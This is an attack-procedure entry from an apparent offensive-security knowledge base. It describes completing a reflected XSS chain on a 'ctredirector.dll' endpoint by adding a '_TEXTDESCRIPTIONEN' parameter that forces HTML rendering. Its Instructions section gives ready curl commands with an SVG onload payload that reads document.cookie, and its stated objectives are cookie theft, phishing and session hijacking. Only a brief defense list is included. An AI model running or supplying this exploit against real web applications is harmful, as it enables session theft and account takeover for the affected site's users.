---
tags:
  - xss
  - content-type-bypass
  - javascript
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-force-html-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:24.974Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: ca683d72-2593-4b60-ac9a-d5ebe36fbe21
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---

# Force-HTML-Rendering-with-_TEXTDESCRIPTIONEN

## Summary

This procedure appends the @_TEXTDESCRIPTIONEN parameter to the request, overriding the response content type to text/html, which causes the browser to parse and execute the previously injected XSS payload from the error echo as malicious JavaScript.

## Description

After injecting the payload in @_FILE, the @_TEXTDESCRIPTIONEN parameter (set to a value like 1) influences the server's response headers to use text/html instead of plain text or other types. This allows the echoed error message, containing the unsanitized input, to be rendered as HTML in the victim's browser, executing scripts such as those stealing session cookies or displaying phishing prompts. This completes the reflected XSS chain, enabling attacks like session hijacking when the victim visits the crafted URL.

## Requirements

1. Successful completion of payload injection via @_FILE
2. Access to the same endpoint with ability to append parameters
3. Victim's browser to process the response (e.g., via direct visit or iframe)

## Defense

Defensive measures and detection strategies:

- Strict content type enforcement regardless of parameters like @_TEXTDESCRIPTIONEN
- Output encoding for all error messages to escape HTML entities
- Browser-based protections like XSS filters in modern browsers
- Server-side logging of parameter manipulations for anomaly detection

## Objectives

1. Override response content type to enable HTML/JS interpretation
2. Execute the reflected payload for cookie theft or phishing
3. Demonstrate full XSS impact including data exfiltration

## Instructions

### Step 1: Append Parameter to Existing Request

**Context**: Build on the injected payload by adding @_TEXTDESCRIPTIONEN to force HTML rendering of the echoed content.

**Command** ([[commands/curl-force-html-xss]]):
```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>&_TEXTDESCRIPTIONEN=1" -v
```

> This sends the combined request, with -v for headers. Expected output shows Content-Type: text/html in headers, and the body renders the SVG tag, potentially executing JS if viewed in a browser.

### Step 2: Test Execution in Browser

**Context**: Use a browser to confirm script execution, as curl won't render HTML.

**Command** ([[commands/curl-force-html-xss]]):
```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>&_TEXTDESCRIPTIONEN=1" --output xss.html && firefox xss.html
```

> Saves response to file and opens in Firefox. Successful execution shows a confirm dialog with cookies.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-force-html-xss]]

## Tools Used

- [[tools/Firefox]]

## Tags

- xss
- content-type-bypass
- javascript

